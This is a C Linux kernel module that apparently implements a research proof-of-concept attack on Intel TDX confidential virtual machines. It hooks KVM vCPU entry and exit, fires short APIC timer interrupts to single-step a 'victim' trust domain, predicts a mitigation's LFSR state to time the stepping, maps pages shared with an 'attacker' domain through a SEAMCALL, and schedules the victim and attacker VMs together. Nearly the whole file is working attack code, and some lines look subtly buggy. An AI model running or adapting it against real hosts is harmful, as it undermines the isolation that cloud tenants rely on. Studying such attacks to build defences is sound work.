#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */ 
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */ 
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include <linux/debugfs.h>
#include <linux/vmalloc.h>
#include <linux/moduleparam.h>
#include <linux/tdx_step.h>
#include "int.h"
#define ATTACKER KERN_INFO "attacker: "
#define IA32_TSC_DEADLINE 0x6e0
volatile uint64_t result = 0;
volatile uint64_t done = 0;

void serialize_(void) {
  asm volatile("serialize":::"memory");
}
uint64_t rdtsc_nofences_(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}

int ioctl_major = 0;
int ioctl_minor = 0;
struct class *chardev_class = NULL;

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
struct file_operations ioctl_interface_fops = {
	.owner = THIS_MODULE,
	.read = NULL,
	.write = NULL,
	.open = NULL,
	.unlocked_ioctl = ioctl,
	.release = NULL,
  .mmap = NULL
};
struct cdev cdev = {
  .owner = THIS_MODULE,
  .ops = &ioctl_interface_fops
};


static int victim_td_pid = -1;
module_param(victim_td_pid, int, 0660);

static int attacker_td_pid = -1;
module_param(attacker_td_pid, int, 0660);


void update_tsc_deadline(void) {
  size_t beg = rdtsc_nofences_()+2000000000/10;
  asm volatile ("wrmsr" :: "c"(IA32_TSC_DEADLINE), "a"(beg), "d"(beg>>32):"memory");
}


extern void (* volatile vcpu_run_beg_hook)(struct OutData *);
extern void (* volatile vcpu_run_end_hook)(struct OutData *);

typedef struct {
	void* vcpu;
	int pid;
} end_hook2_params;
extern void (* volatile vcpu_run_end_hook2)(end_hook2_params* params);


void dumpSharedEPT(uint64_t eptp) {
  eptp &= ~0xfffULL;
  uint64_t *epml4_virt = page_address(pfn_to_page(eptp/4069ULL));
  uint64_t i = 0;
  for (i = 0; i < 512; ++i) printk("EPML4: %llx: %llx\n", i, epml4_virt[i]);
  for (i = 0; i < 512; ++i)
  epml4_virt[i] = -1ULL;
}

static bool page_mapping_exist(unsigned long addr, size_t size) {
    pgd_t *pgd;
    p4d_t *p4d;
    pmd_t *pmd;
    pud_t *pud;
    pte_t *pte;
    struct mm_struct *mm = current->mm;
    unsigned long end_addr;
    pgd = pgd_offset(mm, addr);
    if (unlikely(!pgd) || unlikely(pgd_none(*pgd)) || unlikely(!pgd_present(*pgd)) )
        return false;
    p4d = p4d_offset(pgd, addr);

    if (unlikely(!p4d) || unlikely(p4d_none(*p4d)) || unlikely(!p4d_present(*p4d)) )
        return false;
    
    pud = pud_offset(p4d, addr);
    if (unlikely(!pud) || unlikely(pud_none(*pud)) || unlikely(!pud_present(*pud)))
        return false;

    pmd = pmd_offset(pud, addr);
    if (unlikely(!pmd) || unlikely(pmd_none(*pmd)) || unlikely(!pmd_present(*pmd)))
        return false;

    if (pmd_trans_huge(*pmd)) {
        end_addr = (((addr >> PMD_SHIFT) + 1) << PMD_SHIFT) - 1;
        goto end;
    }
    pte = pte_offset_kernel(pmd, addr);
    if (unlikely(!pte) || unlikely(!pte_present(*pte)))
        return false;
    end_addr = (((addr >> PAGE_SHIFT) + 1) << PAGE_SHIFT) - 1;
end:
    if (end_addr >= addr + size - 1)
        return true;
    return page_mapping_exist(end_addr + 1, size - (end_addr - addr + 1));
}

static bool addr_valid(unsigned long addr, size_t size) {
    int i;
    for (i = 0; i < size; i++) {
        if (!virt_addr_valid(addr + i))
            return false;
    }
    if (!page_mapping_exist(addr, size))
        return false;
    return true;
}


int injected = 0;

int old_timer = 0;
uint64_t old_lvt_timer = 0;


int inj = 0;


uint64_t start_tsc;

atomic_t unloading;
uint64_t rdtsc_nofences(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}
void mfence(void) {
  asm volatile("mfence":::"memory");
}
void lfence(void) {
  asm volatile("lfence":::"memory");
}


extern atomic_t t_mode;

#define OFFSET (4096)



unsigned long int_buffer[8] = {};
int buf_int = 0;



char *debug_buffer;
size_t debug_len;
const size_t debug_max = 1024ULL*1024ULL*1024ULL;
static struct dentry *data_file;
static struct dentry *subdir;

static ssize_t data_read(struct file *, char *, size_t, loff_t *);
static ssize_t data_read(struct file *f, char *buffer,
		size_t len, loff_t *offset) {
	return simple_read_from_buffer(buffer, len, offset, debug_buffer, debug_len);
}

int printDebug(const char *fmt, ...) {
    if (debug_len == debug_max) debug_len = 0;
    int i = snprintf(debug_buffer+debug_len, debug_max-debug_len, "[%llu] ", rdtsc());
    debug_len += i;
    if (debug_len == debug_max) debug_len = 0;
    va_list args; 

    va_start(args, fmt);
    i = vsnprintf(debug_buffer+debug_len, debug_max-debug_len, fmt, args);
    va_end(args);
    debug_len += i;

    return i;
}


char *getAddr(struct OutData *vcpu, size_t pfn) {
  struct kvm_mmu_page *node;
  struct tdp_iter iter;

  list_for_each_entry(node, vcpu->mmu_root, link) {
    for_each_tdp_pte_min_level(iter, node, PG_LEVEL_4K, pfn,pfn+1) {
    
      if (iter.old_spte&0b111) {
  	if (iter.gfn == pfn ) {
	  return  (char*)__va((iter.old_spte&~0xfffULL)&((1ULL<<51)-1));
  	}
      }
    }
  }
  list_for_each_entry(node, vcpu->mmu_root, link) {
    for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, pfn,pfn+1) {
    
      if (iter.old_spte&0b111) {
  	if (iter.gfn = pfn&~0x1ffULL) {
	  return  (char*)__va((iter.old_spte&~0xfffULL)&((1ULL<<51)-1));
  	}
      }
    }
  }
  printk("not found %lx\n", pfn);
  return 0;
}


const uint32_t MASK = 0xB4BCD35C;

uint8_t lfsr_outputs[40];
size_t lfsr_cnt = 0;
uint32_t state = 0;

void lfsrStep(void) {
  uint8_t s = state&1;
  state = state>>1;
  if (s) state ^= MASK;
}

void reverseState(void) {
  for (size_t i = 31; i < 40; --i) {
    size_t c = lfsr_outputs[i]&1;
    if (c) state = state ^ MASK;
    state = (state<<1) | c;
  }
  for (size_t i = 0; i < 31; ++i) lfsrStep();
}

//luca: hook is called immediately before "tdx_vcpu_enter_exit"
void _vcpu_run_beg_hook(struct OutData *vcpu) {
  
  //restore old periodic apic timer value
  if(atomic_read(&unloading)) {
     apic->write(0x320, 0x400ec);
     apic->write(0x380, old_timer);
     update_tsc_deadline();
     return;
  }
  struct kvm_vcpu_arch *arch = (struct kvm_vcpu_arch *)vcpu->kvm_vcpu_arch;

  //luca: trigger short
  if (inj) {
    injected = 1;
    inj = 0;
    serialize();
    //oneshot mode
    apic->write(0x320, 0xecU);
    //very short countdown value
    apic->write(0x380, 2);
    
    //start_tsc = rdtsc_nofences_();
  }
}
struct tdx_module_args {
  /* callee-clobbered */
  u64 rcx;
  u64 rdx;
  u64 r8;
  u64 r9;
  /* extra callee-clobbered */
  u64 r10;
  u64 r11;
  /* callee-saved + rdi/rsi */
  u64 r12;
  u64 r13;
  u64 r14;
  u64 r15;
  u64 rbx;
  u64 rdi;
  u64 rsi;
};
u64 __seamcall_saved_ret(u64 fn, struct tdx_module_args *args);


uint64_t *adddr = 0;

uint64_t stepcnt = 0;


//luca: hook is called immediately after "tdx_vcpu_enter_exit"
void _vcpu_run_end_hook(struct OutData *vcpu) {

  //restore
  if(atomic_read(&unloading)) {
    //Local Vector Table (LVT) Timer Register
    // - Enables periodic mode for the APIC timer 
    // - Sets the interrupt vector to 0xec
     apic->write(0x320, 0x400ec); 
     //set countdown value (initial count)
     apic->write(0x380, old_timer);
     update_tsc_deadline();
     return;
   }

  /*if( get_attack_state() == AS_WAITING_FOR_DONE_MARKER) {
    printk("exit reason %x, is victim_td? %d", vcpu->exit_reason, vcpu->vm_pid == victim_td_pid);
  }*/ 
  if (injected) {
    if (atomic_read(&t_mode) == 3) {
      if(vcpu->vm_pid != victim_td_pid ) {
        printk("ERROR: t_mode = 3 but attacker vm\n");
      }
      //this is the counter local to our module
      stepcnt += 1;
    }
    if (!adddr) {
       printk("TDX: injection wihtout setup, odd....\n");
       goto next;
    }
    //printk("STEPS: 0x%lx,\n", *adddr);
    if (atomic_read(&t_mode) == 1) {
      lfsr_outputs[lfsr_cnt++] = *adddr - 1;
      if (lfsr_cnt == 40) {
        reverseState();
	      for (size_t i = 32; i<40; ++i) {
          lfsrStep();
          if (lfsr_outputs[i] != (state&0x1f)) {
            lfsr_cnt = 0;
            printk("TDX: calibration failed, retry\n");
            goto next;
          }
	      }
        atomic_set(&t_mode, 2);
        printk("TDX: calibrate done %x\n", state);
      }
    }
    //luca: how does 2nd check work? Seems like some kind of check if prediction was correct
    if (atomic_read(&t_mode) == 2 && *adddr != ((state&0x1f)+1)) {
      lfsr_cnt = 0;
      atomic_set(&t_mode, 1);
      printk("TDX: Prediction wrong, recalibrate\n");
    }
    if (atomic_read(&t_mode) > 1 && atomic_read(&t_mode) < 100) {
      lfsrStep();
      //luca: next mitigation will to single-step
      if ((state&0x1f) == 0) {
        //printk("settign t_mode to 3\n");
        atomic_set(&t_mode, 3);
        inj = 1;
      }
      else {
        /*if( atomic_read(&t_mode) == 3) {
          printk("resetting t_mode from 3 to 2\n");
        }*/
        atomic_set(&t_mode, 2);
      }
    }
next:
    injected = 0;
  } // end of "if (injected)""


  //uint64_t reason = vcpu->exit_reason;
  //uint64_t reg_bitmap = vcpu->kvm_vcpu_arch[VCPU_REGS_RCX];
  uint64_t vspec_vmcall = vcpu->kvm_vcpu_arch[VCPU_REGS_R10];
  uint64_t vmcall_leaf = vcpu->kvm_vcpu_arch[VCPU_REGS_R11];

  int is_vmcall = vcpu->exit_reason == 0x4d;




  //luca: 0x40000069ULL means that this is the tdcall from the attacker td
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000069ULL) {
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 1) {
      
    //luca: query all tdcall params
    struct tdx_module_args test = {
        /* callee-clobbered */
        .rcx = vcpu->tdvpr_pa,
        .rdx = 0x203CULL | 3ULL<<32,   
        .r8 = 0,
        .r9 = 0,
        /* extra callee-clobbered */
        .r10 = 0,
        .r11 = 0,
        /* callee-saved + rdi/rsi */
        .r12 = 0,
        .r13 = 0,
        .r14 = 0,
        .r15 = 0,
        .rbx = 0,
        .rdi = 0,
        .rsi = 0
    };
    uint64_t ret = __seamcall_saved_ret(26, &test);
    printDebug("TDX seam result: rax %llx r8 %llx\n", ret, test.r8);
    printDebug("TDX seam result: sizes %lx %lx %lx %lx\n", sizeof
    (EPTPageDirectoryPointerTableEntry),sizeof(EPTPageDirectoryEntry), sizeof(EPTPageTableEntry), sizeof(EPTPageMapLevel4Entry));


    //luca: setup mapping to shared page used by the attacker td?
    uint64_t shared_pfn = test.r8/4096;
    uint64_t *sp = (uint64_t *)page_address(pfn_to_page(shared_pfn));
          EPTPageMapLevel5Entry *pml5 = (EPTPageMapLevel5Entry *)sp;

      //if ((sp[256]&0b111) == 0 || 1) 
      {
        EPTPageMapLevel4Entry *pml4 = (EPTPageMapLevel4Entry *)get_zeroed_page(GFP_KERNEL);
        pml5[15].page_ppn = virt_to_phys(pml4)/4096;
        pml5[15].write = 1;
        pml5[15].read = 1;
        pml5[15].execute = 0;
        EPTPageDirectoryPointerTableEntry *pdpt = (EPTPageDirectoryPointerTableEntry *)get_zeroed_page(GFP_KERNEL);
        pml4[511].page_ppn = virt_to_phys(pdpt)/4096;
        pml4[511].write = 1;
        pml4[511].read = 1;
        pml4[511].execute = 0;
        EPTPageDirectoryEntry *pd = (EPTPageDirectoryEntry *)get_zeroed_page(GFP_KERNEL);
        pdpt[511].page_ppn = virt_to_phys(pd)/4096;
        pdpt[511].write = 1;
        pdpt[511].read = 1;
        pdpt[511].execute = 0;
        EPTPageTableEntry *pt = (EPTPageTableEntry *)get_zeroed_page(GFP_KERNEL);
        pd[511].page_ppn = virt_to_phys(pt)/4096;
        pd[511].write = 1;
        pd[511].read = 1;
        pd[511].execute = 1;
        pd[511].suppress_ve = 0;
        uint64_t *page = (uint64_t *)get_zeroed_page(GFP_KERNEL);
        pt[511].page_ppn = virt_to_phys(page)/4096;
        //pt[511].page_ppn = enc_ppn;
        pt[511].write = 1;
        pt[511].read = 1;
        pt[511].execute = 1;
        pt[511].suppress_ve = 0;
        adddr = page;
        //page[0] = 0x12345678ULL;
      }
          
    } // end of "if statement" for initial tdcall from attacker (r13 == 1)

    if( get_attack_state() != AS_WAITING_FOR_DONE_MARKER ) {
      /*int m = atomic_read(&t_mode);
      if( m != 0) {
        printk("disabling stepping from mode %d\n", m);
      }*/
      atomic_set(&t_mode, 0);
      lfsr_cnt = 0;
      return;
    }

    //luca: only the initial tdcall in the attacker td sets R13 to 1. 
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 2) {
      if (atomic_read(&t_mode) == 100 || atomic_read(&t_mode) == 1) {
      	atomic_set(&t_mode, 1);
      }
      inj = 1;
    }
  }//end of "if statement" that handles attacker tdcall


}

void * volatile last;

// this is called in x86.c in "vcpu_enter_guest"
//luca: this is where we do the scheduling magic: for integration with pagetracking
void scheduling_hook(end_hook2_params* params) {
  if( get_attack_state() == AS_WAITING_FOR_DONE_MARKER ) {
    /*int victim_yield_count = 0;
    int attacker_yield_count = 0;*/

    if( get_attack_state() == AS_WAITING_FOR_DONE_MARKER && params->pid == victim_td_pid && atomic_read(&t_mode) == 0 ) {
      atomic_set(&t_mode, 100);
      //printk("scheduling hook for victim_td, activating t_mode\n");
    }

    //printk("in scheduling_hook with AS_WAITING_FOR_DONE_MARKER, pid= %d, is victim_td %d, t_mode = %d\n",params->pid, params->pid == victim_td_pid,atomic_read(&t_mode));
     while ( get_attack_state() == AS_WAITING_FOR_DONE_MARKER && params->pid == victim_td_pid && atomic_read(&t_mode) != 3 && !atomic_read(&unloading)) {
      /*if( victim_yield_count == 0 ) {
        printk("yielding victim vm\n");
      }
      victim_yield_count += 1;*/
      yield();
    }
    /*if( victim_yield_count > 0 ) {
      printk("finished yielding victim vm, yield count %d\n", victim_yield_count);
    }*/


    while (get_attack_state() == AS_WAITING_FOR_DONE_MARKER && params->pid == attacker_td_pid && (atomic_read(&t_mode) == 3) && !atomic_read(&unloading)) {
      /*if( attacker_yield_count == 0 ) {
        printk("yielding attacker vm\n");
      }
      attacker_yield_count += 1;*/
      yield();
    }
    /*if(attacker_yield_count > 0) {
      printk("finished yielding attacker vm, yield count %d\n");
    }*/


    //printk("end of scheduling_hook for AS_WAITING_FOR_DONE_MARKER, victim yields=%d, attacker yields=%d\n", victim_yield_count, attacker_yield_count);
  }
 
  if(atomic_read(&unloading)) {
     apic->write(0x320, 0x400ec);
     apic->write(0x380, old_timer);
     update_tsc_deadline();
     return;
   }
 
}

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  long ret = -1;
  struct Args args;

  switch (cmd) {
    case COLLECT:
      ret = copy_from_user(&args, (void*)arg, sizeof(struct Args));
      done = 0;
      if (ret != 0) break;
      break;
    case END:
      done = 1;
      ret = 0;
      break;
    default:
      printk(ATTACKER "ioctl cmd not found\n");
      ret = -1;
      break;
  }
  return ret;
}


const struct file_operations data_file_fops = {
	.owner = THIS_MODULE,
	.read = data_read,
};

int init_module(void) 
{
  atomic_set(&t_mode, 0);
  atomic_set(&unloading, 0);
  debug_buffer = vmalloc(1024ULL*1024ULL*1024ULL);
  if (!debug_buffer) {
    return -1;
  }
  subdir = debugfs_create_dir("tdxmod", NULL);
  if (!subdir) {
    vfree(debug_buffer);
    return -1;
  }
  data_file = debugfs_create_file("data", 0644, subdir, NULL, &data_file_fops);
  if (!data_file) {
    vfree(debug_buffer);
    debugfs_remove_recursive(subdir);
    return -1;
  }
  printDebug("loading\n");
  vcpu_run_beg_hook = (void *)_vcpu_run_beg_hook;
  vcpu_run_end_hook = (void *)_vcpu_run_end_hook;
  vcpu_run_end_hook2 = (void *)scheduling_hook;
  return 0;

} 

 

void cleanup_module(void) 
{ 
  atomic_set(&unloading, 1);
  printDebug("unload.\n"); 
  debugfs_remove_recursive(subdir);
  vfree(debug_buffer);
  vcpu_run_beg_hook = 0;
  vcpu_run_end_hook = 0;
  vcpu_run_end_hook2 = 0;
  msleep(1000);
} 

 

MODULE_LICENSE("GPL");
